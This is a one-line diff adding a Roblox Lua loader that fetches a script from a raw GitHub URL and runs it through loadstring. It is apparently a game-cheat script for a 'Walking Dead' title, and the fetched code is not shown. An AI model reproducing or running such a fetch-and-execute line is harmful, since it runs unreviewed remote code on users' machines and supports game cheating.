@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PHUMWIWAT/TEST-ROBLOX/refs/heads/main/TheWalkingDead-O3.lua"))()
